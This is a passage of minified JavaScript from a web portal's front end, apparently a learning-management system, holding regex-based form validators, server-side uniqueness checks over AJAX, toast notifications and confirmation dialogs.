s=o[r];a.includes(s.id)&&(n+=s.text)}""!=n&&n.length>i?(myportal.app.submitForm[t].maxlength=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].maxlength=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validateMaxHTMLLength:function(t,e,i){var a=strip_tags($("#"+t).val());a=htmlspecialchars_decode(a,"ENT_NOQUOTES"),""!=$.trim(a)&&a.length>i?(myportal.app.submitForm[t].maxHTMLlength=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].maxHTMLlength=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validateMinLength:function(t,e,i){""!=$.trim($("#"+t).val())&&$("#"+t).val().length<i?(myportal.app.submitForm[t].minlength=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].minlength=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validateEnum:function(t,e,i){var a=!1;if(""!=$.trim($("#"+t).val()))for(var o in i)if(i[o]==$.trim($("#"+t).val())){a=!0;break}""!=$.trim($("#"+t).val())&&0==a?(myportal.app.submitForm[t].enum=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].enum=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validateStrongPassword:function(t,e){""==$.trim($("#"+t).val())||/^.*(?=.{8,})(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).*$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].strong_password=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].strong_password=!1,myportal.app.validationAddErrorMessage(t,e))},validateLogin:function(t,e,i=null){if(null!==i&&$("#"+t).val()===i.replace("&#039;","'"))return myportal.app.submitForm[t].login=!0,void(1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t));""==$.trim($("#"+t).val())||/^_*\w+(\w*[._@'-]*\w*)*$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].login=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].login=!1,myportal.app.validationAddErrorMessage(t,e))},validateLoginOrEmail:function(t,e){""==$.trim($("#"+t).val())||/^_*\w+(\w*[._@'-]*\w*)*$/.test($.trim($("#"+t).val()))||/^(?:[\w\!\#\$\%\&\'\*\+\-\/\=\?\^\`\{\|\}\~]+\.)*[\w\!\#\$\%\&\'\*\+\-\/\=\?\^\`\{\|\}\~]+@(?:(?:(?:[a-zA-Z0-9_](?:[a-zA-Z0-9_\-](?!\.)){0,61}[a-zA-Z0-9_-]?\.)+[a-zA-Z0-9_](?:[a-zA-Z0-9_\-](?!$)){0,61}[a-zA-Z0-9_]?)|(?:\[(?:(?:[01]?\d{1,2}|2[0-4]\d|25[0-5])\.){3}(?:[01]?\d{1,2}|2[0-4]\d|25[0-5])\]))$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].login=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].login=!1,myportal.app.validationAddErrorMessage(t,e))},validateString:function(t,e){""==$.trim($("#"+t).val())||/^[A-Za-z]{1,100}$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].string=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].string=!1,myportal.app.validationAddErrorMessage(t,e))},validateEmail:function(t,e){""==$.trim($("#"+t).val())||/^(?:[\w\!\#\$\%\&\'\*\+\-\/\=\?\^\`\{\|\}\~]+\.)*[\w\!\#\$\%\&\'\*\+\-\/\=\?\^\`\{\|\}\~]+@(?:(?:(?:[a-zA-Z0-9_](?:[a-zA-Z0-9_\-](?!\.)){0,61}[a-zA-Z0-9_-]?\.)+[a-zA-Z0-9_](?:[a-zA-Z0-9_\-](?!$)){0,61}[a-zA-Z0-9_]?)|(?:\[(?:(?:[01]?\d{1,2}|2[0-4]\d|25[0-5])\.){3}(?:[01]?\d{1,2}|2[0-4]\d|25[0-5])\]))$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].email=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].email=!1,myportal.app.validationAddErrorMessage(t,e))},validateEmailLocalPart:function(t,e){""==$.trim($("#"+t).val())||/^(?:[\w\!\#\$\%\&\'\*\+\-\/\=\?\^\`\{\|\}\~]+\.)*[\w\!\#\$\%\&\'\*\+\-\/\=\?\^\`\{\|\}\~]+$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].email_local_part=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].email_local_part=!1,myportal.app.validationAddErrorMessage(t,e))},validateEmailList:function(t,e){""==$.trim($("#"+t).val())||/^((?:[\w\!\#\$\%\&\'\*\+\-\/\=\?\^\`\{\|\}\~]+\.)*[\w\!\#\$\%\&\'\*\+\-\/\=\?\^\`\{\|\}\~]+@(?:(?:(?:[a-zA-Z0-9_](?:[a-zA-Z0-9_\-](?!\.)){0,61}[a-zA-Z0-9_-]?\.)+[a-zA-Z0-9_](?:[a-zA-Z0-9_\-](?!$)){0,61}[a-zA-Z0-9_]?)|(?:\[(?:(?:[01]?\d{1,2}|2[0-4]\d|25[0-5])\.){3}(?:[01]?\d{1,2}|2[0-4]\d|25[0-5])\]))(\s*\s\s*|\s*$))*$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].email_list=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].email_list=!1,myportal.app.validationAddErrorMessage(t,e))},validateUintId:function(t,e){""==$.trim($("#"+t).val())||/^[0-9]{1,100}$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].uint_id=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].uint_id=!1,myportal.app.validationAddErrorMessage(t,e))},validateInt:function(t,e){""==$.trim($("#"+t).val())||/^(\+|-)?\d+$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].int=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].int=!1,myportal.app.validationAddErrorMessage(t,e))},validateHex:function(t,e){""==$.trim($("#"+t).val())||/^[0-9a-fA-F]{1,100}$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].hex=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].hex=!1,myportal.app.validationAddErrorMessage(t,e))},validateColor:function(t,e){""==$.trim($("#"+t).val())||/^#([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].color=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].color=!1,myportal.app.validationAddErrorMessage(t,e))},validateTimestamp:function(t,e){""==$.trim($("#"+t).val())||/^[0-9]{10}$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].timestamp=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].timestamp=!1,myportal.app.validationAddErrorMessage(t,e))},validateDate:function(t,e,i){switch(i){case"yyyy/mm/dd":var a=/^[0-9]{4}\/[0-1]?[0-9]\/[0-3]?[0-9]$/;break;case"mm/dd/yyyy":a=/^[0-1]?[0-9]\/[0-3]?[0-9]\/[0-9]{4}$/;break;case"dd/mm/yyyy":default:a=/^[0-3]?[0-9]\/[0-1]?[0-9]\/[0-9]{4}$/}""==$.trim($("#"+t).val())||a.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].date=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].date=!1,myportal.app.validationAddErrorMessage(t,e))},validateAlnum:function(t,e){""==$.trim($("#"+t).val())||/^[A-Za-z0-9_]{1,100}$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].alnum=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].alnum=!1,myportal.app.validationAddErrorMessage(t,e))},validateLdapAttribute:function(t,e){""==$.trim($("#"+t).val())||/^[A-Za-z0-9:;\-_]{1,100}$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].ldap_attribute=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].ldap_attribute=!1,myportal.app.validationAddErrorMessage(t,e))},validateAlnumWithSpaces:function(t,e){""==$.trim($("#"+t).val())||/^[A-Za-z0-9_\s]{1,100}$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].alnum_with_spaces=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].alnum_with_spaces=!1,myportal.app.validationAddErrorMessage(t,e))},validateAlnumWithDashes:function(t,e){""==$.trim($("#"+t).val())||/^[_\-A-Za-z0-9]{1,100}$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].alnum_with_dashes=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].alnum_with_dashes=!1,myportal.app.validationAddErrorMessage(t,e))},validateAlnumGeneral:function(t,e){""==$.trim($("#"+t).val())||/^[\.,_\-A-Za-z0-9\s]{1,100}$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].alnum_general=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].alnum_general=!1,myportal.app.validationAddErrorMessage(t,e))},validateText:function(t,e){""!=$.trim($("#"+t).val())&&/^.*[$\/\'\"]+.*$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].text=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].text=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validateNoScript:function(t,e){""!=$.trim($("#"+t).val())&&/^.*<script>.*<\/script>.*$/i.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].noscript=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].noscript=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validatePath:function(t,e){""!=$.trim($("#"+t).val())&&/^.*[$\"]+.*$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].path=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].path=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validateUrl:function(t,e){""==$.trim($("#"+t).val())||/^(http:\/\/www\.|https:\/\/www\.|http:\/\/|https:\/\/)[a-z0-9]+([\-\.]{1,2}[a-z0-9]+)*\.[a-z]{2,64}(:[0-9]{1,5})?(\/.*)?$/i.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].url=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].url=!1,myportal.app.validationAddErrorMessage(t,e))},validateNoUrl:function(t,e,i){var a=!0;if(""!=$.trim($("#"+t).val()))for(var o in i)if(new RegExp("\\"+i[o]+"((\\s|/).*)?$","i").test($.trim($("#"+t).val()))){a=!1;break}""!=$.trim($("#"+t).val())&&0==a?(myportal.app.submitForm[t].no_url=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].no_url=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validateHasTopLevelDomain:function(t,e,i){var a=!1;if(""!=$.trim($("#"+t).val()))for(var o in i)if(new RegExp("\\"+i[o]+"(\\/.*)?$","i").test($.trim($("#"+t).val()))){a=!0;break}""!=$.trim($("#"+t).val())&&0==a?(myportal.app.submitForm[t].has_top_level_domain=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].has_top_level_domain=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validateNoIpV6:function(t,e){""!=$.trim($("#"+t).val())&&/(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].no_ipv6=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].no_ipv6=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validateNoIpV4:function(t,e){""!=$.trim($("#"+t).val())&&/[0-9]{1,3}(\.[0-9]{1,3}){3}/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].no_ipv4=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].no_ipv4=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validateDomain:function(t,e){""==$.trim($("#"+t).val())||/^[a-zA-Z0-9]{3,50}$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].domain=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].domain=!1,myportal.app.validationAddErrorMessage(t,e))},validateDomainDots:function(t,e){""==$.trim($("#"+t).val())||/^[a-z0-9-\.]{1,100}$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].domain_dots=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].domain_dots=!1,myportal.app.validationAddErrorMessage(t,e))},validateDomainsList:function(t,e){""==$.trim($("#"+t).val())||/^~?[a-z0-9-\.]{1,100}\.[a-z]{1,20}(?:, *~?[a-z0-9-\.]{1,100}\.[a-z]{1,20})*$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].domains_list=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].domains_list=!1,myportal.app.validationAddErrorMessage(t,e))},validateLinkedinUrl:function(t,e){""==$.trim($("#"+t).val())||/linkedin.com\/profile\/add\?_ed=/i.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].linkedin_profile_url=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].linkedin_profile_url=!1,myportal.app.validationAddErrorMessage(t,e))},validateBranchName:function(t,e){""==$.trim($("#"+t).val())||/^[a-z0-9]{3,50}$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].branch_name=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].branch_name=!1,myportal.app.validationAddErrorMessage(t,e))},validateTestPassScore:function(t,e){""!=$.trim($("#"+t).val())&&(parseFloat($.trim($("#"+t).val()))<0||parseFloat($.trim($("#"+t).val()))>100||!/^[0-9]{1,3}(?:\.[0-9]{1,3})?$/.test($.trim($("#"+t).val())))?(myportal.app.submitForm[t].test_pass_score=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].test_pass_score=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validatePrice:function(t,e,i){if(1==i)var a=/^[0-9]{1,10}(?:\.[0-9]{1,1})?$/;else if(2==i)a=/^[0-9]{1,10}(?:\.[0-9]{1,2})?$/;else if(3==i)a=/^[0-9]{1,10}(?:\.[0-9]{1,3})?$/;""==$.trim($("#"+t).val())||a.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].price=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].price=!1,myportal.app.validationAddErrorMessage(t,e))},validateDiscount:function(t,e,i){""!=$.trim($("#"+t).val())&&(parseFloat($.trim($("#"+t).val()))<=0||parseFloat($.trim($("#"+t).val()))>i||!/^[0-9]{1,3}(?:\.[0-9]{1,3})?$/.test($.trim($("#"+t).val())))?(myportal.app.submitForm[t].discount=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].discount=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validatePercentage:function(t,e,i,a){""!=$.trim($("#"+t).val())&&(parseFloat($.trim($("#"+t).val()))<i||parseFloat($.trim($("#"+t).val()))>a||!/^[0-9]{1,3}(?:\.[0-9]{1,3})?$/.test($.trim($("#"+t).val())))?(myportal.app.submitForm[t].percentage=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].percentage=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validateCourseTimeLimit:function(t,e){""==$.trim($("#"+t).val())||/^[0-9]{1,10}(?:\.[1-9]{1,2})?$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].course_time_limit=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].course_time_limit=!1,myportal.app.validationAddErrorMessage(t,e))},validateGreaterThan:function(t,e,i){""!=$.trim($("#"+t).val())&&parseInt($.trim($("#"+t).val()))<=i?(myportal.app.submitForm[t].greater_than=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].greater_than=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validateLessThanOrEqualTo:function(t,e,i){""!=$.trim($("#"+t).val())&&parseInt($.trim($("#"+t).val()))>i?(myportal.app.submitForm[t].less_than_or_equal_to=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].less_than_or_equal_to=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validateGreaterThanOrEqualTo:function(t,e,i){""!=$.trim($("#"+t).val())&&parseInt($.trim($("#"+t).val()))<i?(myportal.app.submitForm[t].greater_than_or_equal_to=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].greater_than_or_equal_to=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},validateUserUniqueLogin:function(t,e){e=e.replace("##user-login##",encodeURIComponent($.trim($("#"+t).val()))),myportal.app.ajax(e,{async:!1,success:function(e){if($.parseJSON(e).success){var i=$.parseJSON(e).data;""!=$.trim($("#"+t).val())&&0==i.valid?(myportal.app.submitForm[t].user_unique_login=!1,myportal.app.validationAddErrorMessage(t,decodeURIComponent(i.message))):(myportal.app.submitForm[t].user_unique_login=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))}}})},validateUserUniqueEmail:function(t,e){e=e.replace("##user-email##",$.trim($("#"+t).val())),myportal.app.ajax(e,{async:!1,success:function(e){if($.parseJSON(e).success){var i=$.parseJSON(e).data;""!=$.trim($("#"+t).val())&&0==i.valid?(myportal.app.submitForm[t].user_unique_email=!1,myportal.app.validationAddErrorMessage(t,decodeURIComponent(i.message))):(myportal.app.submitForm[t].user_unique_email=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))}}})},validateRegistrationEmailRestriction:function(t,e,i){i=i.replace("##user-email##",$.trim($("#"+t).val())),myportal.app.ajax(i,{async:!1,success:function(i){if($.parseJSON(i).success){var a=$.parseJSON(i).data;""!=$.trim($("#"+t).val())&&0==a.valid?(myportal.app.submitForm[t].registration_email_restriction=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].registration_email_restriction=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))}}})},validateDisposableEmailDomain:function(t,e,i){i=i.replace("##user-email##",$.trim($("#"+t).val())),myportal.app.ajax(i,{async:!1,success:function(i){if($.parseJSON(i).success){var a=$.parseJSON(i).data;""!=$.trim($("#"+t).val())&&0==a.valid?(myportal.app.submitForm[t].email_disposable=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].email_disposable=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))}}})},validateCourseUniqueCode:function(t,e,i){i=i.replace("##course-code##",$.trim($("#"+t).val())),myportal.app.ajax(i,{async:!1,success:function(i){if($.parseJSON(i).success){var a=$.parseJSON(i).data;""!=$.trim($("#"+t).val())&&0==a.valid?(myportal.app.submitForm[t].course_unique_code=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].course_unique_code=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))}}})},validateGroupUniqueKey:function(t,e,i){i=i.replace("##group-key##",$.trim($("#"+t).val())),myportal.app.ajax(i,{async:!1,success:function(i){if($.parseJSON(i).success){var a=$.parseJSON(i).data;""!=$.trim($("#"+t).val())&&0==a.valid?(myportal.app.submitForm[t].group_unique_key=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].group_unique_key=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))}}})},validateBranchUniqueName:function(t,e,i){i=i.replace("##branch-name##",$.trim($("#"+t).val())),myportal.app.ajax(i,{async:!1,success:function(i){if($.parseJSON(i).success){var a=$.parseJSON(i).data;""!=$.trim($("#"+t).val())&&0==a.valid?(myportal.app.submitForm[t].branch_unique_name=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].branch_unique_name=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))}}})},validateDomainUniqueName:function(t,e,i){i=i.replace("##domain-name##",$.trim($("#"+t).val())),myportal.app.ajax(i,{async:!1,success:function(i){if($.parseJSON(i).success){var a=$.parseJSON(i).data;""!=$.trim($("#"+t).val())&&0==a.valid?(myportal.app.submitForm[t].domain_unique_name=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].domain_unique_name=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))}}})},validateDomainIgnoredName:function(t,e,i){i=i.replace("##domain-name##",$.trim($("#"+t).val())),myportal.app.ajax(i,{async:!1,success:function(i){if($.parseJSON(i).success){var a=$.parseJSON(i).data;""!=$.trim($("#"+t).val())&&0==a.valid?(myportal.app.submitForm[t].domain_ignored_name=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].domain_ignored_name=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))}}})},validateDomainAllowedName:function(t,e,i){i=i.replace("##domain-name##",$.trim($("#"+t).val())),myportal.app.ajax(i,{async:!1,success:function(i){if($.parseJSON(i).success){var a=$.parseJSON(i).data;""!=$.trim($("#"+t).val())&&0==a.valid?(myportal.app.submitForm[t].domain_allowed_name=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].domain_allowed_name=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))}}})},validateAccountInternalSubdomain:function(t,e,i){i=i.replace("##domain-name##",$.trim($("#"+t).val())),myportal.app.ajax(i,{async:!1,success:function(i){if($.parseJSON(i).success){var a=$.parseJSON(i).data;""!=$.trim($("#"+t).val())&&0==a.valid?(myportal.app.submitForm[t].account_internal_subdomain=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].account_internal_subdomain=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))}}})},validateCouponUniqueCode:function(t,e,i){i=i.replace("##coupon-code##",$.trim($("#"+t).val())),myportal.app.ajax(i,{async:!1,success:function(i){if($.parseJSON(i).success){var a=$.parseJSON(i).data;""!=$.trim($("#"+t).val())&&0==a.valid?(myportal.app.submitForm[t].coupon_unique_code=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].coupon_unique_code=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))}}})},validateCmsUniqueTitle:function(t,e,i){i=i.replace("##title##",$.trim(encodeURIComponent($("#"+t).val()))),myportal.app.ajax(i,{async:!1,success:function(i){if($.parseJSON(i).success){var a=$.parseJSON(i).data;""!=$.trim($("#"+t).val())&&0==a.valid?(myportal.app.submitForm[t].cms_unique_title=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].cms_unique_title=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))}}})},validateCmsUniqueUrlPath:function(t,e,i){i=i.replace("##url_path##",$.trim(encodeURIComponent($("#"+t).val()))),myportal.app.ajax(i,{async:!1,success:function(i){if($.parseJSON(i).success){var a=$.parseJSON(i).data;""!=$.trim($("#"+t).val())&&0==a.valid?(myportal.app.submitForm[t].cms_unique_url_path=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].cms_unique_url_path=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))}}})},validateFieldsUniqueName:function(t,e,i){i=i.replace("##name##",$.trim(encodeURIComponent($("#"+t).val()))),myportal.app.ajax(i,{async:!1,success:function(i){if($.parseJSON(i).success){var a=$.parseJSON(i).data;""!=$.trim($("#"+t).val())&&0==a.valid?(myportal.app.submitForm[t].fields_unique_name=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].fields_unique_name=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))}}})},validateZoomPassword:function(t,e){""==$.trim($("#"+t).val())||/^[_\-@\*A-Za-z0-9]+$/.test($.trim($("#"+t).val()))?(myportal.app.submitForm[t].zoom_password=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t)):(myportal.app.submitForm[t].zoom_password=!1,myportal.app.validationAddErrorMessage(t,e))},validateNotOnlySpaces:function(t,e){""!=$("#"+t).val()&&""==$.trim($("#"+t).val())?(myportal.app.submitForm[t].not_only_spaces=!1,myportal.app.validationAddErrorMessage(t,e)):(myportal.app.submitForm[t].not_only_spaces=!0,1==myportal.app.validationSoFar(t)&&myportal.app.validationClearErrorMessage(t))},notify:function(t){var e=JSON.parse(JSON.stringify(t||{})),i=["info","warning","success","error"].indexOf(e.type)>-1;if(e.type=i?e.type:"info",e.title=e.title||null,e.message=e.message||null,e.timeOut)a=e.timeOut;else var a="success"==e.type?3e3:1e4;e.options={positionClass:"toast-top-center",closeButton:!1,rtl:window.isRtl,timeOut:a,extendedTimeOut:2*a,hideDuration:200,showMethod:"slideDown",hideMethod:"slideUp",hideEasing:"linear",closeEasing:"linear"},e.type&&e.message&&toastr[e.type](e.message,e.title,e.options)},removeAllNotifications:function(){toastr.remove()},confirm:function(t,e,i,a,o,n,r,s){void 0!==myportal.app.continueDeleting&&1==myportal.app.continueDeleting?i(a):(t&&$(".tl-modal-header").text(t),$("#tl-modal-body").html(e),o&&$("#tl-confirm-submit").html(o),r&&$("#tl-confirm-continue").html(r),s&&($("#tl-confirm-continue").removeClass("btn-danger"),$("#tl-confirm-continue").addClass(n)),n&&($("#tl-confirm-submit").removeClass("btn-danger"),$("#tl-confirm-submit").addClass(n)),$("#tl-confirm-submit").unbind("click"),$("#tl-confirm-submit").bind("click",(function(){void 0===myportal.app.deletesnr&&(myportal.app.deletesnr=0),myportal.app.deletesnr=myportal.app.deletesnr+1,1==myportal.app.deletesnr&&"tl-restore-default-system-notifications"!=a.id&&"tl-reactivate-subscription"!=a.id&&$("#tl-confirm-continue").removeClass("hide"),i(a),$("#tl-confirm").modal("hide")})),$("#tl-confirm-continue").unbind("click"),$("#tl-confirm-continue").bind("click",(function(){void 0===myportal.app.continueDeleting&&(myportal.app.continueDeleting=!0),i(a),$("#tl-confirm").modal("hide")})),$("#tl-confirm").modal())},confirmLeavePage:function(t,e,i,a){$("#tl_leavepage_confirm .modal-header h3").html(t),$("#tl_leavepage_confirm .modal-body p").html(e),$("#tl-leavepage").unbind("click"),$("#tl-leavepage").bind("click",(function(){i(a)})),$("#tl_leavepage_confirm .modal-header a.close").bind("click",(function(){myportal.app.leavingFromNormalLink=!1})),$('#tl_leavepage_confirm .modal-footer 